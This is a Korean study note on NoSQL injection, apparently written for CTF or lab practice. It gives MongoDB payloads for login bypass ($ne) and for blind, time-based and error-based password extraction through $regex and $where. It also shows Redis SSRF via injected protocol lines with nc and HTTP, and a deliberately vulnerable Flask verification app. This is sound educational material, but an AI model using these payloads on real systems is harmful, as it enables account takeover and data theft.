# NoSQL

## MongoDB
### 특징
1. 스키마가 존재하지 않아 각 테이블에 특별한 정의를 하지 않아도 됨
2. JSON 형식으로 쿼리문 작성 가능
3. _id필드가 기본키 역할을 함
### vs MySQL
```sql
SELECT * FROM inventory WHERE status = "A" and qty < 30;
```
```MongoDB
db.inventory.find( { $and: [ { status: "A" }, { qty: { $lt: 30 } } ] } )
```
### 연산자
#### Comparsion
- $eq :지정된 값과 같은 값을 찾습니다. (equal)
- $gt : 지정된 값보다 큰 값을 찾습니다. (greater than)
- $gte : 지정된 값보다 크거나 같은 값을 찾습니다. (greater than equal)
- $in : 배열 안의 값들과 일치하는 값을 찾습니다. (in)
- $lt : 지정된 값보다 작은 값을 찾습니다. (less than)
- $lte : 지정된 값보다 작거나 같은 값을 찾습니다. (less than equal)
- $ne : 지정된 값과 같지 않은 값을 찾습니다. (not equal)
- $nin : 배열 안의 값들과 일치하지 않는 값을 찾습니다. (not in)

#### Logical
- $and : 논리적 AND, 각각의 쿼리를 모두 만족하는 문서가 반환됩니다.
- $not : 쿼리 식의 효과를 반전시킵니다. 쿼리 식과 일치하지 않는 문서를 반환합니다.
- $nor : 논리적 NOR, 각각의 쿼리를 모두 만족하지 않는 문서가 반환됩니다.
- $or : 논리적 OR, 각각의 쿼리 중 하나 이상 만족하는 문서가 반환됩니다.

#### Element
- $exists : 지정된 필드가 있는 문서를 찾습니다.
- $type : 지정된 필드가 지정된 유형인 문서를 선택합니다.

#### Evaluation
- $expr : 쿼리 언어 내에서 집계 식을 사용할 수 있습니다.
- $jsonSchema : 주어진 JSON 스키마에 대해 문서를 검증합니다.
- $mod : 필드 값에 대해 mod 연산을 수행하고 지정된 결과를 가진 문서를 선택합니다.
- $regex : 지정한 정규식과 일치하는 문서를 선택합니다.
- $text : 지정한 텍스트를 검색합니다.
- $where : 지정한 자바스크립트 식을 만족하는 문서와 일치합니다.

### 연산자를 이용한 공격 예시
```
http://localhost:3000/query?uid[$ne]=a&upw[$ne]=a
=> [{"_id":"5ebb81732b75911dbcad8a19","uid":"admin","upw":"secretpassword"}]
```

### Blind Injection
$regex와 $where를 통해 Blind Injection 수행
> db.user.find({upw: {$regex: "^a"}})
> db.user.find({upw: {$regex: "^b"}})
> db.user.find({upw: {$regex: "^c"}})

### where 조건 사용
$where을 통해 자바스크립트 식과 함께 데이터 비교. 단 필드 안에서는 사용할 수 없음. <br/>
> db.user.find({$where:"return 1==1"})
> { "_id" : ObjectId("5ea0110b85d34e079adb3d19"), "uid" : "guest", "upw" : "guest" }
> db.user.find({uid:{$where:"return 1==1"}})
> error: {
>	"$err" : "Can't canonicalize query: BadValue $where cannot be applied to a field",
>	"code" : 17287
> }

### Blind Injection
> db.user.find({$where: "this.upw.substring(0,1)=='a'"})
> db.user.find({$where: "this.upw.substring(0,1)=='b'"})
> db.user.find({$where: "this.upw.substring(0,1)=='c'"})

> example
> 1. 길이 찾기
> {"uid" : "admin", "upw" : {"$regex" : ".{5}"}}
> 2. 비밀번호 추출하기
> {"uid": "admin", "upw": {"$regex":"^a"}}
> {"uid": "admin", "upw": {"$regex":"^aa"}}
> {"uid": "admin", "upw": {"$regex":"^ab"}}

### Time Based Injection
db.user.find({$where: `this.uid=='${req.query.uid}'&&this.upw=='${req.query.upw}'`}); 이런 코드로 조회하는 경우
> /?uid=guest'&&this.upw.substring(0,1)=='a'&&sleep(5000)&&'1
> /?uid=guest'&&this.upw.substring(0,1)=='b'&&sleep(5000)&&'1
> /?uid=guest'&&this.upw.substring(0,1)=='c'&&sleep(5000)&&'1

### Error Based Injection
> db.user.find({$where: "this.uid=='guest'&&this.upw.substring(0,1)=='g'&&asdf&&'1'&&this.upw=='${upw}'"});
error: {
	"$err" : "ReferenceError: asdf is not defined near '&&this.upw=='${upw}'' ",
	"code" : 16722
}
// this.upw.substring(0,1)=='g' 값이 참이기 때문에 asdf 코드를 실행하다 에러 발생
> db.user.find({$where: "this.uid=='guest'&&this.upw.substring(0,1)=='a'&&asdf&&'1'&&this.upw=='${upw}'"});
// this.upw.substring(0,1)=='a' 값이 거짓이기 때문에 뒤에 코드가 작동하지 않음


## Redis
### SSRF 공격
유효하지 않은 명령어가 입력돼도 다음 명령어를 실행함.
```
$ echo -e "anydata: anydata\r\nget hello" | nc 127.0.0.1 6379
-ERR unknown command 'anydata:'
$5
world
```
대표적으로 HTTP 프로토콜을 사용해서 공격함
```
POST / HTTP/1.1
host: 127.0.0.1:6379
user-agent: Mozilla/5.0...
content-type: application/x-www-form-urlencoded
data=a
SET key value
...
```

### django-redis-cache
Django에서 Redis를 사용한 캐시를 구현할 수 있는 파이썬 모듈.
```python
# settings.py
CACHES = {
    "default": {
        "BACKEND": "django_redis.cache.RedisCache",
        "LOCATION": "redis://127.0.0.1:6379/"
    }
}
# views.py
from django.http import HttpResponse
from .models import Memo
from django.core.cache import cache
def p_set(request):
    cache.set('cache_memo', Memo('memo test!!'))
    return HttpResponse('set seesion')
```

### 실습모듈
```python
app = Flask(__name__)
app.secret_key = os.urandom(32)
DEV_MODE = True
REDIS_HOST = '127.0.0.1'
conn = redis.Redis(host=REDIS_HOST, charset='utf-8', decode_responses=True)
@app.route('/email_send', methods=['GET', 'POST'])
def email_send():
  if request.method == 'GET':
    return render_template('email_send.html')
  elif request.method == 'POST':
    email = request.form.get('email', '')
    rand = f'{random.randint(0, 999999):06d}'
    if DEV_MODE or send_mail(email, rand):  # if DEV_MODE disable send_mail
      conn.set(email, rand)
      conn.set(f'{email}_count', '0')
      return 'send_mail'
    else:
      return 'Fail send_mail'
@app.route('/email_verify', methods=['POST'])
def email_verify():
  email = request.form.get('email', '')
  auth_code = request.form.get('auth_code', '')
  if conn.get(email) == auth_code:
    conn.delete(email)
    # Verify OK !
    return f'Success, Flag is {FLAG.FLAG}'
  conn.incr(f'{email}_count')
  count = int(conn.get(f'{email}_count'))
  if count > 5:
    return 'Limit'
  return 'Fail'
app.run(host='0.0.0.0', port=5000, threaded=True)
```



## CouchDB